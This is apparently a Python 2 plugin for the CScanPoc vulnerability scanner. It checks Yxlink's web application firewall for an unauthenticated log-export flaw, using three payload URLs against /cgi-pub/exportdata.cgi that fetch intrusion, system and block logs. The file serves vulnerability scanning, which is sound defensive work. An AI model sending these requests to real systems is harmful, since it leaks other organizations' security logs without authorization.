# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'YXLink_0006'  # 平台漏洞编号，留空
    name = '铱迅web应用防护系统 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-02-26'  # 漏洞公布时间
    desc = '''
        铱迅的WAF在圈子里的口碑还是不错的，很多政府企业使用。
        /cgi-pub/exportdata.cgi 存在非登录状态下可以获取“系统日志”“入侵记录日志”“阻断日志”等等。
        可导致相关存在问题的url地址泄露。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '铱迅web应用防护系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd622c72a-fadc-49ea-8125-c238665de06a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # info:http://www.wooyun.org/bugs/wooyun-2015-098450\http://www.wooyun.org/bugs/wooyun-2015-0134150
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = (
                # 入侵日志
                '/cgi-pub/exportdata.cgi?type=1&begintime=20150101&endtime=20150102',
                # 系统日志
                '/cgi-pub/exportdata.cgi?type=3&begintime=20150101&endtime=20150102',
                # 阻断日志
                '/cgi-pub/exportdata.cgi?type=12&begintime=20150101&endtime=20151218'
            )
            for payload in payloads:
                url = arg + payload
                code, head, res, errcode, _ = hh.http(url)

                if code == 200 and 'Attack Time' in res and 'Action' in res:
                    # security_hole("铱迅web应用安全网关信息泄漏,参照：wooyun-2015-098450，wooyun-2015-0134150\n%s\n%s\n%s"%(exp1,exp2,exp3))
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
